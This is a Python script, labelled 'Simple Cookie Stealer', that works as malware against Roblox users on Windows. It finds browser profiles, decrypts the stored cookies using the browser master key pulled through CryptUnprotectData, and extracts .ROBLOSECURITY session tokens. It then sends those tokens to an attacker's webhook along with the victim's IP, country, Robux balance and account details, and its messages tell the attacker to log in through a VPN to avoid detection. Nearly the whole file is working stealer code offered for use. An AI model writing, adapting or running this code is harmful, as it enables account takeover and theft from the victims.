import io
import os
import json
import base64
import shutil
import zipfile
import sqlite3
import requests
import subprocess
import threading
import traceback
import random

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES 

webhook = "WEBHOOK GOES HERE"
debug = False # Secret thingy for development (Don't mess with it)

def safe(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception:
            if debug:
                traceback.print_exc()
    return wrapper

class CookieLogger:

    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    def __init__(self):
        browsers = self.findBrowsers()

        info = requests.get("http://ip-api.com/json/").json()


        self.embeds = [{
            "username": "Simple Cookie Stealer",
            "title": "Victim Found!",
            "description" : f"You can find the Cookies in the embeds.\nUse a VPN to connect to the area below in order to log in.",
            "color": 12422241,

            "fields": [
                {"name": "IP", "value": info["query"], "inline": True},
                {"name": "Area", "value": info["country"], "inline": True},
            ]
        }]

        threads = [threading.Thread(target=self.getCookie, args=(browser[0], browser[1])) for browser in browsers]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
    
        if len(self.embeds) == 1:
            requests.post(webhook, json={"embeds": [{
            "username": "Simple Cookie Stealer",
            "title": "No Cookies Found!",
            "description" : f"A Victim ran the Stealer, but it did not find any Roblox Cookies.",
            "color": 12422241,

            "fields": [
                {"name": "IP", "value": info["query"], "inline": True},
                {"name": "Location", "value": info["country"], "inline": True},
            ]
        }]})

        embedsSplit = [self.embeds[idx:idx+10] for idx in range(len(self.embeds)) if idx % 10 == 0]
        for embeds in embedsSplit:
            data = {"embeds": embeds}
            requests.post(webhook, json=data)
        
    @safe
    def handleEmbed(self, roblosec):

        if not roblosec:
            return

        basicInfo = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": roblosec}).json()
        username = basicInfo["UserName"]
        userId = basicInfo["UserID"]
        robux = basicInfo["RobuxBalance"]
        premium = basicInfo["IsPremium"]

        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
        creationDate = advancedInfo["created"]
        creationDate = creationDate.split("T")[0]
        creationDate = creationDate.split("-")
        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"

        embed = {
            "username": "Simple Cookie Stealer",
            "title": "Cookie Found!",
            "description" : f"Log in with the Cookie Below. You may need to use a VPN to connect to the Area shown in the First Embed.",
            "color": 12422241,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "User ID", "value": userId, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Has Premium", "value": premium, "inline": True},
                {"name": "Creation Date", "value": creationDate, "inline": True},
                {"name": "Cookie", "value": f"```{roblosec}```", "inline": False}

            ]
        }

        self.embeds.append(embed)

    @safe
    def findBrowsers(self):
        found = []

        for root in [self.appdata, self.localappdata]:
            for directory in os.listdir(root):
                try:
                    for _root, _, _ in os.walk(os.path.join(root, directory)):
                        for file in os.listdir(_root):
                            if file == "Local State":
                                if "Default" in os.listdir(_root):
                                    found.append([_root, True])
                                elif "Login Data" in os.listdir(_root):
                                    found.append([_root, False])
                                else:
                                    pass
                except Exception:
                    pass

        return found

    @safe
    def getMasterKey(self, browserPath):
        with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
            localState = json.loads(f.read())
        
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        truncatedMasterKey = masterKey[5:]

        return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

    @safe
    def decryptCookie(self, cookie, masterKey):
        iv = cookie[3:15]
        encryptedValue = cookie[15:]

        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
        decryptedValue = cipher.decrypt(encryptedValue)

        return decryptedValue[:-16].decode()

    @safe
    def getCookie(self, browserPath, isProfiled):

        cookiesFound = []

        profiles = ["Default"]
        try:
            masterKey = self.getMasterKey(browserPath)
        except Exception:
            return cookiesFound

        if isProfiled:
            for directory in os.listdir(browserPath):
                if directory.startswith("Profile "):
                    profiles.append(directory)
        
        if not isProfiled:
            if "Network" in os.listdir(browserPath):
                cookiePath = os.path.join(browserPath, "Network", "Cookies")
            else:
                cookiePath = os.path.join(browserPath, "Cookies")

            filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(256)]) + '.db' # Random name so there aren't collisions
            
            shutil.copy2(cookiePath, filename)
            connection = sqlite3.connect(filename)
            cursor = connection.cursor()

            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for cookie in cursor.fetchall():
                if cookie[0].endswith("roblox.com") and cookie[2]:
                    decrypted = self.decryptCookie(cookie[2], masterKey)
                    try:
                        if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
                            cookiesFound.append(decrypted)
                    except Exception:
                        pass

            connection.close()
            os.remove(filename)
        
        else:
            for profile in profiles:
                if "Network" in os.listdir(os.path.join(browserPath, profile)):
                    cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                else:
                    cookiePath = os.path.join(browserPath, profile, "Cookies")

                filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(20)]) + '.db' # Random name so there aren't collisions

                shutil.copy2(cookiePath, filename)
                connection = sqlite3.connect(filename)
                cursor = connection.cursor()

                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for cookie in cursor.fetchall():
                    if cookie[0].endswith("roblox.com") and cookie[2]:
                        decrypted = self.decryptCookie(cookie[2], masterKey)
                        try:
                            if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
                                cookiesFound.append(decrypted)
                        except Exception:
                            pass
                
                connection.close()
                os.remove(filename)

        for cookie in cookiesFound:
            self.handleEmbed(cookie)

if __name__ == "__main__":
    CookieLogger()
